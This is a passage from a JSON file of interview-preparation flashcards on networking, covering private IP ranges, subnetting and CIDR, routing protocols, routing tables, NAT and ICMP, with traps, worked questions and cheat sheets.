        "100.64.0.0/10": "CGNAT Shared Address Space for ISPs"
      },
      "diagramType": "ipv4-header"
    },
    {
      "cardNumber": 5,
      "badge": "Process Flow",
      "title": "Step-by-Step Flow",
      "scenario": "Two completely separate homes in New York and Tokyo both have laptops with IP 192.168.1.15.",
      "challenge": "Why does this duplicate IP address not cause an IP collision or packet confusion on the Internet?",
      "resolution": "192.168.1.15 is an RFC 1918 private IP. Each home router translates outbound traffic to its own distinct public WAN IP before placing packets on the Internet.",
      "vfxType": "nat"
    },
    {
      "cardNumber": 6,
      "badge": "Example",
      "title": "Real-World Technical Example",
      "exampleValues": {
        "Home PC Private IP": "192.168.1.105",
        "Home Router Gateway": "192.168.1.1",
        "Home Router Public IP": "203.0.113.88 (Assigned by ISP)",
        "WhatIsMyIP Response": "Shows 203.0.113.88, not 192.168.1.105"
      }
    },
    {
      "cardNumber": 7,
      "badge": "Execution",
      "title": "Interactive Live Flow Simulation",
      "fullWorkingFlow": "Complete end-to-end packet transmission for Public vs Private IP (RFC 1918 Ranges & CGNAT). Observe how data moves between sender, intermediate network nodes, and receiver with dynamic states.",
      "vfxType": "nat"
    },
    {
      "cardNumber": 8,
      "badge": "Traps",
      "title": "Common Mistakes & Interview Traps",
      "traps": [
        {
          "wrong": "An Internet website like Google can send an unsolicited packet directly to 192.168.1.10.",
          "why": "Public internet routers drop RFC 1918 addresses; private IPs are non-routable.",
          "correct": "Inbound communication requires an existing NAT state entry or Port Forwarding on the router."
        },
        {
          "wrong": "172.32.0.1 is a private IP address.",
          "why": "Class B private range stops strictly at 172.31.255.255.",
          "correct": "172.32.0.1 is a PUBLIC IP address, not private."
        },
        {
          "wrong": "Private IP addresses are inherently encrypted.",
          "why": "Private IP is an addressing classification, not an encryption mechanism.",
          "correct": "Packets inside a private LAN travel in cleartext unless encrypted by protocols like TLS or IPsec."
        }
      ]
    },
    {
      "cardNumber": 9,
      "badge": "Interview",
      "title": "Interview & Placement Question",
      "questions": [
        {
          "q": "What are the exact RFC 1918 private IPv4 address ranges?",
          "a": "The three RFC 1918 private IPv4 ranges are: 1. Class A: 10.0.0.0 to 10.255.255.255 (Prefix 10.0.0.0/8, total 16,777,216 IPs). 2. Class B: 172.16.0.0 to 172.31.255.255 (Prefix 172.16.0.0/12, total 1,048,576 IPs, spanning 16 Class B equivalents). 3. Class C: 192.168.0.0 to 192.168.255.255 (Prefix 192.168.0.0/16, total 65,536 IPs, spanning 256 Class C equivalents).",
          "tip": "Memorize the exact boundaries: 10.0.0.0/8, 172.16.0.0/12, and 192.168.0.0/16. Be careful about 172.16 to 172.31."
        }
      ]
    },
    {
      "cardNumber": 10,
      "badge": "Summary",
      "title": "Quick Revision & Cheat Sheet",
      "cheatSheet": {
        "keyRule": "Private IPs: 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16. Non-routable on the public Internet.",
        "summaryPoints": [
          "RFC 1918 reserves 3 blocks for internal, isolated, non-routable communication.",
          "Internet transit routers drop RFC 1918 packets unconditionally.",
          "NAT bridges internal private IP clients to the public Internet.",
          "CGNAT (100.64.0.0/10) enables ISPs to multiplex thousands of users behind public IPs."
        ],
        "whenToUse": "Designing VPC networks in AWS/Azure/GCP and troubleshooting home/office router configurations."
      }
    }
  ],
  "subnetting-cidr": [
    {
      "cardNumber": 1,
      "badge": "Concept",
      "title": "What is Subnetting & CIDR?",
      "inSimpleWords": "Subnetting is the practice of dividing a large physical IP network into smaller, logically isolated sub-networks (subnets) by borrowing bits from the host portion to extend the network prefix.",
      "analogy": "Cutting a large single-family mansion into 4 separate locked apartments. Each apartment gets its own entrance door and privacy, while sharing the master street address.",
      "diagramType": null
    },
    {
      "cardNumber": 2,
      "badge": "Motivation",
      "title": "Why do we need Subnetting & CIDR?",
      "problem": "Giving a company with 50 employees an entire /24 network leaves 204 unused host addresses and subjects all 50 PCs to broadcast storms.",
      "whyItMatters": "Subnetting conserves IPv4 addresses, enhances security by isolating departments, improves routing efficiency, and confines broadcast traffic.",
      "howSolves": "CIDR notation (e.g. /26) indicates how many contiguous leading bits represent the network. The remaining bits determine host capacity: 2^(32 - prefix) - 2."
    },
    {
      "cardNumber": 3,
      "badge": "Mechanics",
      "title": "How does Subnetting & CIDR work?",
      "steps": [
        {
          "step": 1,
          "title": "Identify Host Requirement",
          "desc": "Determine needed hosts per subnet. Add 2 (for Network ID and Broadcast IP)."
        },
        {
          "step": 2,
          "title": "Calculate Host Bits (H)",
          "desc": "Find smallest power of 2 where 2^H - 2 >= required hosts."
        },
        {
          "step": 3,
          "title": "Determine CIDR Prefix",
          "desc": "Prefix length = 32 - H. Subnet mask sets prefix bits to 1, host bits to 0."
        },
        {
          "step": 4,
          "title": "Calculate Block Size (Delta)",
          "desc": "Block size = 2^H (or 256 - interesting octet mask value). Jump by block size to find subnets."
        }
      ],
      "vfxType": "routing"
    },
    {
      "cardNumber": 4,
      "badge": "Architecture",
      "title": "Internal Structure & Formats",
      "structureDetails": {
        "/24": "Mask: 255.255.255.0 | Total: 256 IPs | Usable Hosts: 254",
        "/25": "Mask: 255.255.255.128 | Total: 128 IPs | Usable Hosts: 126",
        "/26": "Mask: 255.255.255.192 | Total: 64 IPs | Usable Hosts: 62",
        "/27": "Mask: 255.255.255.224 | Total: 32 IPs | Usable Hosts: 30",
        "/28": "Mask: 255.255.255.240 | Total: 16 IPs | Usable Hosts: 14",
        "/30": "Mask: 255.255.255.252 | Total: 4 IPs | Usable Hosts: 2 (Point-to-Point WAN link)"
      },
      "diagramType": null
    },
    {
      "cardNumber": 5,
      "badge": "Process Flow",
      "title": "Step-by-Step Flow",
      "scenario": "You are given 192.168.10.0/24 and told to create 4 equal-sized subnets for HR, Sales, IT, and Guests.",
      "challenge": "How do you calculate the subnet mask, valid IP ranges, and broadcast address for each department?",
      "resolution": "Borrow 2 bits: 2^2 = 4 subnets. New prefix = /26 (mask 255.255.255.192). Block size = 64. Subnets are: .0/26, .64/26, .128/26, and .192/26.",
      "vfxType": "routing"
    },
    {
      "cardNumber": 6,
      "badge": "Example",
      "title": "Real-World Technical Example",
      "exampleValues": {
        "Subnet 1 Range": "Network: 192.168.10.0 | Usable: 192.168.10.1 - .62 | Broadcast: 192.168.10.63",
        "Subnet 2 Range": "Network: 192.168.10.64 | Usable: 192.168.10.65 - .126 | Broadcast: 192.168.10.127",
        "Subnet 3 Range": "Network: 192.168.10.128 | Usable: 192.168.10.129 - .190 | Broadcast: 192.168.10.191",
        "Subnet 4 Range": "Network: 192.168.10.192 | Usable: 192.168.10.193 - .254 | Broadcast: 192.168.10.255"
      }
    },
    {
      "cardNumber": 7,
      "badge": "Execution",
      "title": "Interactive Live Flow Simulation",
      "fullWorkingFlow": "Complete end-to-end packet transmission for Subnetting & CIDR (Classless Inter-Domain Routing). Observe how data moves between sender, intermediate network nodes, and receiver with dynamic states.",
      "vfxType": "routing"
    },
    {
      "cardNumber": 8,
      "badge": "Traps",
      "title": "Common Mistakes & Interview Traps",
      "traps": [
        {
          "wrong": "A /26 subnet provides 64 usable host addresses.",
          "why": "You must always subtract 2 for Network ID and Broadcast IP.",
          "correct": "A /26 has 64 total addresses, but only 62 usable host addresses."
        },
        {
          "wrong": "A point-to-point router link should use a /24 subnet.",
          "why": "A /24 wastes 252 host addresses for a link connecting only two routers.",
          "correct": "Point-to-point serial links use /30 (2 usable hosts) or /31 (RFC 3021)."
        },
        {
          "wrong": "Subnet mask 1s and 0s can be interleaved randomly (e.g. 11010111).",
          "why": "Subnet masks MUST consist of contiguous 1s followed by contiguous 0s.",
          "correct": "A valid mask is always contiguous 1s on the left and contiguous 0s on the right."
        }
      ]
    },
    {
      "cardNumber": 9,
      "badge": "Interview",
      "title": "Interview & Placement Question",
      "questions": [
        {
          "q": "What is the network address, broadcast address, and number of usable hosts for the IP 172.16.50.85 with subnet mask 255.255.255.224 (/27)?",
          "a": "1. Mask 255.255.255.224 is /27. The interesting octet is the 4th octet (224). 2. Block size = 256 - 224 = 32. 3. Subnets in the 4th octet increase in multiples of 32: 0, 32, 64, 96, 128... 4. The host IP 85 falls between 64 and 95. 5. Network Address = 172.16.50.64. 6. Broadcast Address = next subnet (96) minus 1 = 172.16.50.95. 7. Usable Host Range = 172.16.50.65 through 172.16.50.94. 8. Usable Hosts = 2^(32-27) - 2 = 2^5 - 2 = 32 - 2 = 30 usable hosts.",
          "tip": "Master the 256 - Mask = Block Size trick. It lets you solve any subnetting question in 15 seconds."
        }
      ]
    },
    {
      "cardNumber": 10,
      "badge": "Summary",
      "title": "Quick Revision & Cheat Sheet",
      "cheatSheet": {
        "keyRule": "CIDR /N has 32-N host bits. Total = 2^(32-N); Usable = 2^(32-N) - 2. Block size = 256 - Mask.",
        "summaryPoints": [
          "Network ID is the first address (host bits all 0).",
          "Broadcast Address is the last address (host bits all 1).",
          "Borrowing 1 bit doubles the number of subnets and halves hosts per subnet.",
          "CIDR enables Supernetting (Route Summarization) to shrink core routing tables."
        ],
        "whenToUse": "Mandatory calculation skill tested in virtually every technical placement exam and interview."
      }
    }
  ],
  "routing-fundamentals": [
    {
      "cardNumber": 1,
      "badge": "Concept",
      "title": "What is Routing Fundamentals?",
      "inSimpleWords": "Routing is the Layer 3 process by which routers inspect the destination IP address of an incoming packet and determine the optimal next-hop interface to forward it toward its final destination.",
      "analogy": "GPS navigation: Static routing is driving a fixed memorized route every day; Dynamic routing is Google Maps continuously recalculating alternate detours based on real-time traffic jams.",
      "diagramType": null
    },
    {
      "cardNumber": 2,
      "badge": "Motivation",
      "title": "Why do we need Routing Fundamentals?",
      "problem": "Networks change constantly as fiber cables get cut, routers reboot, and links get congested. Manually updating routes on 10,000 global routers is impossible.",
      "whyItMatters": "Routing algorithms ensure resilient, self-healing communication across the global Internet, rerouting packets around damaged nodes within seconds.",
      "howSolves": "Dynamic routing protocols (OSPF, BGP) share topology information between neighbors and compute shortest paths using graph algorithms (Dijkstra, Bellman-Ford)."
    },
    {
      "cardNumber": 3,
      "badge": "Mechanics",
      "title": "How does Routing Fundamentals work?",
      "steps": [
        {
          "step": 1,
          "title": "Static Routing",
          "desc": "Administrator manually hardcodes route: `ip route 10.0.0.0 255.0.0.0 192.168.1.1`. Low CPU, zero overhead, but cannot adapt to failures."
        },
        {
          "step": 2,
          "title": "Distance Vector (RIP)",
          "desc": "Routers share their entire routing table with immediate neighbors periodically. Metric = hop count (max 15). Bellman-Ford algorithm."
        },
        {
          "step": 3,
          "title": "Link State (OSPF)",
          "desc": "Routers flood Link State Advertisements (LSAs) to build full topology map. Computes shortest path tree using Dijkstra's algorithm. Metric = bandwidth/cost."
        },
        {
          "step": 4,
          "title": "Path Vector (BGP)",
          "desc": "Exterior gateway protocol connecting global Autonomous Systems (AS). Metric = AS path list and administrative business policies."
        }
      ],
      "vfxType": "routing"
    },
    {
      "cardNumber": 4,
      "badge": "Architecture",
      "title": "Internal Structure & Formats",
      "structureDetails": {
        "Static Routing": "Administrative Distance: 1 | Zero bandwidth overhead | Manual updates",
        "RIP (Distance Vector)": "AD: 120 | Metric: Hop Count (max 15 hops) | Periodic 30s updates",
        "OSPF (Link State)": "AD: 110 | Metric: Cost (10^8 / Bandwidth) | Fast convergence | Dijkstra SPF",
        "BGP (Path Vector)": "AD: 20 (eBGP), 200 (iBGP) | Metric: AS-Path, Local Pref, MED | Powers the Internet"
      },
      "diagramType": null
    },
    {
      "cardNumber": 5,
      "badge": "Process Flow",
      "title": "Step-by-Step Flow",
      "scenario": "A primary optical fiber line connecting Mumbai and Delhi is severed by a highway construction excavator.",
      "challenge": "Thousands of live bank transactions and video calls are traversing the link at 100 Gbps.",
      "resolution": "OSPF detects lost hello packets within 3 seconds, recalculates the shortest path via a backup link through Pune, and reconverges routing tables automatically.",
      "vfxType": "routing"
    },
    {
      "cardNumber": 6,
      "badge": "Example",
      "title": "Real-World Technical Example",
      "exampleValues": {
        "Interior Gateway Protocols (IGP)": "OSPF, IS-IS, EIGRP, RIP (operate inside single enterprise)",
        "Exterior Gateway Protocols (EGP)": "BGP-4 (operates between global internet service providers)",
        "Count-to-Infinity Problem": "Distance vector loop flaw mitigated by Split Horizon and Poison Reverse"
      }
    },
    {
      "cardNumber": 7,
      "badge": "Execution",
      "title": "Interactive Live Flow Simulation",
      "fullWorkingFlow": "Complete end-to-end packet transmission for Routing Fundamentals (Static, Dynamic, Distance Vector, Link State). Observe how data moves between sender, intermediate network nodes, and receiver with dynamic states.",
      "vfxType": "routing"
    },
    {
      "cardNumber": 8,
      "badge": "Traps",
      "title": "Common Mistakes & Interview Traps",
      "traps": [
        {
          "wrong": "RIP is preferred over OSPF because hop count is simpler.",
          "why": "A 1-hop 56 kbps dialup link looks 'shorter' to RIP than a 2-hop 10 Gbps fiber link.",
          "correct": "OSPF uses link bandwidth cost, making it vastly superior to RIP's crude hop-count metric."
        },
        {
          "wrong": "Routers recalculate their entire routing table for every single packet.",
          "why": "Routing algorithms run asynchronously in the control plane; forwarding plane uses cached FIB tables.",
          "correct": "Routing protocols populate the Routing Information Base (RIB); hardware ASICs forward packets via FIB cache at wire-speed."
        },
        {
          "wrong": "Static routes have higher Administrative Distance than dynamic routes.",
          "why": "Static routes have AD = 1, meaning they take precedence over dynamic protocols (OSPF AD=110, RIP AD=120).",
          "correct": "Lower Administrative Distance = higher trust/priority. Directly connected (AD 0) > Static (AD 1) > OSPF (AD 110)."
        }
      ]
    },
    {
      "cardNumber": 9,
      "badge": "Interview",
      "title": "Interview & Placement Question",
      "questions": [
        {
          "q": "What is the difference between Distance Vector and Link State routing algorithms?",
          "a": "1. Routing knowledge: Distance Vector routers only know distance (hops) and vector (direction/next-hop) learned secondhand from immediate neighbors ('routing by rumor'). Link State routers flood link states so every router in the area builds an identical, complete map of the entire network topology. 2. Algorithm: Distance Vector uses Bellman-Ford; Link State uses Dijkstra's Shortest Path First (SPF). 3. Updates: Distance Vector sends periodic full table updates; Link State sends triggered, incremental updates only when a link state changes. 4. Convergence & Scalability: Link State converges drastically faster without routing loops and scales to large enterprise networks.",
          "tip": "Remember: Distance Vector = 'routing by rumor' (Bellman-Ford); Link State = 'knows the whole map' (Dijkstra)."
        }
      ]
    },
    {
      "cardNumber": 10,
      "badge": "Summary",
      "title": "Quick Revision & Cheat Sheet",
      "cheatSheet": {
        "keyRule": "Lower Administrative Distance (AD) wins. Static (1) > OSPF (110) > RIP (120). Link State > Distance Vector.",
        "summaryPoints": [
          "Routing determines the next-hop interface for destination IP packets.",
          "Distance Vector (RIP) uses hop count (max 15); Link State (OSPF) uses bandwidth cost.",
          "Dijkstra's SPF algorithm computes shortest path tree in OSPF.",
          "BGP routes between Autonomous Systems (AS) using AS-Path attributes."
        ],
        "whenToUse": "Network infrastructure architecture, ISP routing design, and technical placement exams."
      }
    }
  ],
  "routing-table-gateway": [
    {
      "cardNumber": 1,
      "badge": "Concept",
      "title": "What is Routing Table Lookup & Default Gateway?",
      "inSimpleWords": "A routing table is an in-memory database stored on hosts and routers mapping destination network prefixes to next-hop IP addresses and exit interfaces. The Default Gateway is the fallback router used when no specific route matches.",
      "analogy": "A highway exit signboard: 'For downtown, take Exit 4; for airport, take Exit 7; for ALL OTHER CITIES, stay on Interstate 95 (Default Route 0.0.0.0/0).'",
      "diagramType": null
    },
    {
      "cardNumber": 2,
      "badge": "Motivation",
      "title": "Why do we need Routing Table Lookup & Default Gateway?",
      "problem": "An end host or router cannot store individual routes for all 4.3 billion internet IP addresses.",
      "whyItMatters": "Without a default gateway (0.0.0.0/0), a computer can only talk to machines on its own local subnet and cannot access the Internet.",
      "howSolves": "Routers evaluate incoming destination IPs using Longest Prefix Match (LPM). If no specific prefix matches, the packet is forwarded to the Default Gateway."
    },
    {
      "cardNumber": 3,
      "badge": "Mechanics",
      "title": "How does Routing Table Lookup & Default Gateway work?",
      "steps": [
        {
          "step": 1,
          "title": "Packet Ingress",
          "desc": "Packet arrives with destination IP (e.g. 172.16.5.42)."
        },
        {
          "step": 2,
          "title": "Longest Prefix Match (LPM)",
          "desc": "Router compares dest IP against all routing table entries. The most specific (longest mask) match wins."
        },
        {
          "step": 3,
          "title": "Next-Hop Resolution",
          "desc": "Router identifies next-hop IP and outgoing physical interface (e.g. eth0)."
        },
        {
          "step": 4,
          "title": "Default Route Fallback",
          "desc": "If no specific subnet matches, router forwards packet to 0.0.0.0/0 (Default Gateway)."
        }
      ],
      "vfxType": "routing"
    },
    {
      "cardNumber": 4,
      "badge": "Architecture",
      "title": "Internal Structure & Formats",
      "structureDetails": {
        "Destination Network": "Target IP prefix (e.g. 10.0.0.0/24 or 0.0.0.0/0)",
        "Next-Hop (Gateway)": "IP address of the next router along the path",
        "Interface": "Physical or virtual egress port (e.g. GigabitEthernet0/1)",
        "Metric / Cost": "Route preference score (lower metric = preferred path)",
        "Administrative Distance": "Trustworthiness rating of the route source"
      },
      "diagramType": null
    },
    {
      "cardNumber": 5,
      "badge": "Process Flow",
      "title": "Step-by-Step Flow",
      "scenario": "A laptop at 192.168.1.15 pings an Amazon web server at 54.239.28.85.",
      "challenge": "The laptop's routing table has no entry for 54.239.28.85.",
      "resolution": "The laptop matches the default route (0.0.0.0/0 -> 192.168.1.1) and forwards the packet to its home router's MAC address.",
      "vfxType": "routing"
    },
    {
      "cardNumber": 6,
      "badge": "Example",
      "title": "Real-World Technical Example",
      "exampleValues": {
        "Command Windows": "route print or netstat -rn",
        "Command Linux": "ip route show",
        "Default Route Entry": "0.0.0.0/0 via 192.168.1.1 dev eth0",
        "Longest Prefix Example": "/28 route preferred over /24 route for the same IP"
      }
    },
    {
      "cardNumber": 7,
      "badge": "Execution",
      "title": "Interactive Live Flow Simulation",
      "fullWorkingFlow": "Complete end-to-end packet transmission for Routing Table Lookup & Default Gateway. Observe how data moves between sender, intermediate network nodes, and receiver with dynamic states.",
      "vfxType": "routing"
    },
    {
      "cardNumber": 8,
      "badge": "Traps",
      "title": "Common Mistakes & Interview Traps",
      "traps": [
        {
          "wrong": "A router chooses the route with the lowest metric over a route with a longer prefix mask.",
          "why": "Prefix length ALWAYS takes precedence over metric and administrative distance.",
          "correct": "Longest Prefix Match (LPM) is evaluated FIRST. Metric is only compared when prefix lengths are identical."
        },
        {
          "wrong": "The default gateway must be on a different subnet than the host.",
          "why": "A host cannot communicate with an IP outside its subnet without a gateway.",
          "correct": "The Default Gateway IP MUST reside on the exact same local IP subnet as the host."
        },
        {
          "wrong": "0.0.0.0/0 matches only destination IP 0.0.0.0.",
          "why": "Mask /0 means ZERO bits are checked, matching ALL possible IPv4 addresses.",
          "correct": "0.0.0.0/0 is the default route matching any packet that failed to match more specific routes."
        }
      ]
    },
    {
      "cardNumber": 9,
      "badge": "Interview",
      "title": "Interview & Placement Question",
      "questions": [
        {
          "q": "Explain the Longest Prefix Match (LPM) algorithm in IP routing with an example.",
          "a": "Longest Prefix Match (LPM) is the algorithm used by routers to select the winning route from the routing table when a destination IP matches multiple entries. The router selects the entry with the longest subnet mask (most specific network prefix). For example, consider a packet destined for IP 192.168.1.130. The routing table contains three matching entries: 1. 0.0.0.0/0 (Default route, mask length 0). 2. 192.168.1.0/24 (Mask length 24). 3. 192.168.1.128/28 (Mask length 28). The destination IP 192.168.1.130 satisfies all three rules. The router chooses Route 3 (192.168.1.128/28) because /28 is the longest prefix match (28 bits vs 24 bits vs 0 bits).",
          "tip": "Always emphasize that prefix length takes priority before administrative distance or routing metric."
        }
      ]
    },
    {
      "cardNumber": 10,
      "badge": "Summary",
      "title": "Quick Revision & Cheat Sheet",
      "cheatSheet": {
        "keyRule": "Most specific route wins (Longest Prefix Match). Default route 0.0.0.0/0 is the fallback of last resort.",
        "summaryPoints": [
          "Routing table matches destination IP using Longest Prefix Match (LPM).",
          "Default Gateway is the exit router for all remote internet traffic.",
          "Default route syntax: 0.0.0.0/0 (IPv4) or ::/0 (IPv6).",
          "Gateway IP must reside on the host's local IP subnet."
        ],
        "whenToUse": "Network configuration, diagnosing internet connectivity loss, and packet tracing."
      }
    }
  ],
  "nat-network-address-translation": [
    {
      "cardNumber": 1,
      "badge": "Concept",
      "title": "What is NAT?",
      "inSimpleWords": "Network Address Translation (NAT, RFC 1631) modifies the source or destination IP and port numbers in packet headers as they traverse a router, enabling multiple private devices to share a single public IP.",
      "analogy": "A corporate mailroom: 500 internal employees (private IPs) send letters out through one company street address (public IP). The mailroom stamps an internal tracking number (Port number) on each letter so incoming replies get delivered to the correct person.",
      "diagramType": null
    },
    {
      "cardNumber": 2,
      "badge": "Motivation",
      "title": "Why do we need NAT?",
      "problem": "With only 4.3 billion IPv4 addresses and 25 billion devices globally, individual devices cannot all have unique public IPv4 addresses.",
      "whyItMatters": "Port Address Translation (PAT / NAT Overload) is the single technology that prevented the Internet from halting due to IPv4 address exhaustion in the late 1990s.",
      "howSolves": "A NAT gateway router maintains a state translation table mapping internal private sockets (IP:Port) to its single external public socket (Public IP:Port)."
    },
    {
      "cardNumber": 3,
      "badge": "Mechanics",
      "title": "How does NAT work?",
      "steps": [
        {
          "step": 1,
          "title": "Outbound Request",
          "desc": "Host 192.168.1.10:52000 sends HTTP request to 142.250.72.14:443."
        },
        {
          "step": 2,
          "title": "NAT Table Entry Creation",
          "desc": "Router rewrites Source IP to its WAN IP 203.0.113.5 and assigns unique source port 40001."
        },
        {
          "step": 3,
          "title": "Internet Transit",
          "desc": "Packet traverses internet: [Src: 203.0.113.5:40001 -> Dest: 142.250.72.14:443]."
        },
        {
          "step": 4,
          "title": "Inbound De-NAT",
          "desc": "Web server replies to 203.0.113.5:40001. Router checks table, rewrites Dest to 192.168.1.10:52000, forwards to PC."
        }
      ],
      "vfxType": "nat"
    },
    {
      "cardNumber": 4,
      "badge": "Architecture",
      "title": "Internal Structure & Formats",
      "structureDetails": {
        "Static NAT": "1-to-1 permanent mapping between private IP and public IP (hosting internal servers)",
        "Dynamic NAT": "Pool of public IPs mapped dynamically to internal hosts on first-come basis",
        "PAT / NAT Overload": "Many-to-1 mapping using 16-bit Layer 4 source ports (up to ~64,000 concurrent sessions)",
        "SNAT vs DNAT": "SNAT rewrites Source IP (outbound); DNAT / Port Forwarding rewrites Dest IP (inbound)"
      },
      "diagramType": null
    },
    {
      "cardNumber": 5,
      "badge": "Process Flow",
      "title": "Step-by-Step Flow",
      "scenario": "A university campus with 20,000 students connects to the Internet using only two public IPv4 addresses.",
      "challenge": "How can 20,000 laptops stream YouTube and browse websites simultaneously with only 2 public IPs?",
      "resolution": "Port Address Translation (PAT) multiplexes connections across unique source port numbers (e.g. 203.0.113.1:10000 through :65535).",
      "vfxType": "nat"
    },
    {
      "cardNumber": 6,
      "badge": "Example",
      "title": "Real-World Technical Example",
      "exampleValues": {
        "NAT Table Row": "TCP | 192.168.1.50:51234 <==> 203.0.113.5:40001 <==> 142.250.72.14:443",
        "Port Forwarding": "Incoming 203.0.113.5:80 translated to internal web server 192.168.1.200:80",
        "NAT Traversal": "STUN, TURN, and ICE protocols used by WebRTC to traverse symmetric NAT firewalls"
      }
    },
    {
      "cardNumber": 7,
      "badge": "Execution",
      "title": "Interactive Live Flow Simulation",
      "fullWorkingFlow": "Complete end-to-end packet transmission for NAT (Network Address Translation) & PAT / SNAT / DNAT. Observe how data moves between sender, intermediate network nodes, and receiver with dynamic states.",
      "vfxType": "nat"
    },
    {
      "cardNumber": 8,
      "badge": "Traps",
      "title": "Common Mistakes & Interview Traps",
      "traps": [
        {
          "wrong": "NAT is an encryption security protocol.",
          "why": "NAT was created as an address conservation tool; it does not encrypt payloads.",
          "correct": "NAT provides incidental perimeter concealment (hiding internal IPs), but is not a substitute for firewall rules or TLS encryption."
        },
        {
          "wrong": "A remote client on the Internet can initiate a direct connection to a private IP behind NAT.",
          "why": "The router has no existing NAT table entry for unsolicited inbound traffic.",
          "correct": "Unsolicited inbound connections require explicit Port Forwarding (DNAT) or UPnP configuration."
        },
        {
          "wrong": "NAT works at Layer 3 only.",
          "why": "PAT (NAT Overload) inspects and rewrites Layer 4 TCP and UDP port numbers.",
          "correct": "Standard PAT operates across both Layer 3 (IP) and Layer 4 (Ports)."
        }
      ]
    },
    {
      "cardNumber": 9,
      "badge": "Interview",
      "title": "Interview & Placement Question",
      "questions": [
        {
          "q": "What is the difference between SNAT (Source NAT) and DNAT (Destination NAT)?",
          "a": "SNAT (Source NAT) rewrites the private Source IP address of an outbound packet to a public IP as it leaves the local network. It is used when internal clients initiate connections to external internet servers. DNAT (Destination NAT / Port Forwarding) rewrites the Destination IP address of an inbound packet arriving on the router's public interface to an internal private server IP. It is used when external internet users need to access an internal service (e.g. accessing a company web server hosted at private IP 10.0.1.50 via public IP 203.0.113.10:443).",
          "tip": "Remember: SNAT = Outbound client browsing; DNAT = Inbound server hosting (Port Forwarding)."
        }
      ]
    },
    {
      "cardNumber": 10,
      "badge": "Summary",
      "title": "Quick Revision & Cheat Sheet",
      "cheatSheet": {
        "keyRule": "PAT (NAT Overload) maps thousands of private IPs to 1 public IP using unique 16-bit port numbers.",
        "summaryPoints": [
          "Solves IPv4 exhaustion by multiplexing private RFC 1918 addresses behind one public IP.",
          "Maintains a stateful NAT table matching internal socket to external socket.",
          "SNAT = Source IP rewrite (outbound traffic); DNAT = Destination IP rewrite (port forwarding).",
          "Breaks pure end-to-end IP peer-to-peer connectivity (requires STUN/TURN for WebRTC)."
        ],
        "whenToUse": "Home/office internet routing, AWS NAT Gateways, Docker container port binding, and firewall design."
      }
    }
  ],
  "icmp-protocol": [
    {
      "cardNumber": 1,
      "badge": "Concept",
      "title": "What is ICMP?",
      "inSimpleWords": "Internet Control Message Protocol (ICMP, RFC 792) is a network-layer diagnostic and error-reporting protocol used by network devices to report transmission problems and test reachability.",
      "analogy": "The dashboard warning lights on a car: it doesn't carry passengers or luggage (user data), but flashes critical status alerts like 'Engine Overheating' (TTL Expired) or 'Road Blocked' (Destination Unreachable).",
      "diagramType": null
    },
    {
      "cardNumber": 2,
      "badge": "Motivation",
      "title": "Why do we need ICMP?",
      "problem": "When a router cannot forward a packet due to a severed link, high congestion, or expired TTL, it needs a standardized way to notify the sender why the packet was dropped.",
      "whyItMatters": "ICMP powers essential diagnostic tools (`ping` and `traceroute`) used daily by systems engineers and cloud operators.",
      "howSolves": "Routers encapsulate ICMP error messages inside IP packets (Protocol 1) returning Type and Code values explaining the exact failure condition."
    },
    {
      "cardNumber": 3,
      "badge": "Mechanics",
      "title": "How does ICMP work?",
      "steps": [
        {
          "step": 1,
          "title": "Type 8 (Echo Request)",
          "desc": "Sent by `ping` client to test whether target IP is alive and measure round-trip latency."
        },
        {
          "step": 2,
          "title": "Type 0 (Echo Reply)",
          "desc": "Target replies confirming it is active and reachable."
        },
        {
          "step": 3,
          "title": "Type 3 (Dest Unreachable)",
          "desc": "Sent by router if host, network, or port is unreachable (Code 0: Net, Code 1: Host, Code 3: Port)."
        },
        {
          "step": 4,
          "title": "Type 11 (Time Exceeded)",
          "desc": "Sent by router when packet TTL decrements to 0. Foundational mechanism for `traceroute`."
        }
      ],
      "vfxType": "packet-travel"
    },
    {
      "cardNumber": 4,
      "badge": "Architecture",
      "title": "Internal Structure & Formats",
      "structureDetails": {
        "IP Protocol Number": "Protocol 1 (operates directly over IP without TCP/UDP)",
        "Type (8 bits)": "Message category (e.g. 0=Reply, 8=Request, 3=Unreachable, 11=TTL Expired)",
        "Code (8 bits)": "Sub-reason detailing specific error condition",
        "Checksum (16 bits)": "Integrity checksum covering entire ICMP message",
        "Original Header": "Includes original IP header + first 8 bytes of original payload to match error to socket"
      },
      "diagramType": null
    },
    {
      "cardNumber": 5,
      "badge": "Process Flow",
      "title": "Step-by-Step Flow",
      "scenario": "A system administrator tests if a production database at 10.0.5.20 is responsive.",
      "challenge": "The admin executes `ping 10.0.5.20` and receives 'Destination Host Unreachable'.",
      "resolution": "The default gateway router generated an ICMP Type 3 Code 1 message because its ARP request for 10.0.5.20 timed out (the server was physically powered down).",
      "vfxType": "packet-travel"
    },
    {
      "cardNumber": 6,
      "badge": "Example",
      "title": "Real-World Technical Example",
      "exampleValues": {
        "Type 8 / Code 0": "Echo Request (`ping`)",
        "Type 0 / Code 0": "Echo Reply (`pong`)",
        "Type 3 / Code 3": "Destination Port Unreachable (sent by OS when UDP port is closed)",
        "Type 11 / Code 0": "Time to Live (TTL) exceeded in transit (used by `traceroute`)"
      }
    },
    {
      "cardNumber": 7,
      "badge": "Execution",
      "title": "Interactive Live Flow Simulation",
      "fullWorkingFlow": "Complete end-to-end packet transmission for ICMP (Internet Control Message Protocol) & Diagnostics. Observe how data moves between sender, intermediate network nodes, and receiver with dynamic states.",
      "vfxType": "packet-travel"
    },
    {
      "cardNumber": 8,
      "badge": "Traps",
      "title": "Common Mistakes & Interview Traps",
      "traps": [
        {
          "wrong": "ICMP runs over TCP or UDP.",
          "why": "ICMP is a Layer 3 protocol encapsulated directly inside IP packets (Protocol field = 1).",
          "correct": "ICMP has no port numbers; it is encapsulated directly in the IP packet."
        },
        {
          "wrong": "If a server does not reply to ping, the server is guaranteed to be down.",
          "why": "Many enterprise firewalls block ICMP Type 8 Echo Requests to prevent reconnaissance scanning.",
          "correct": "A blocked ping often means ICMP is dropped by a firewall, even if the web server (HTTP port 80) is running perfectly."
        },
        {
          "wrong": "ICMP error messages generate ICMP error messages if they fail.",
          "why": "This would cause an infinite broadcast storm of error messages.",
          "correct": "Routers NEVER generate an ICMP error in response to a failed ICMP error message."
        }
      ]
    },
    {
      "cardNumber": 9,
      "badge": "Interview",
      "title": "Interview & Placement Question",
      "questions": [
        {
          "q": "How does `traceroute` use ICMP and the IP TTL field to discover all router hops between a client and a server?",
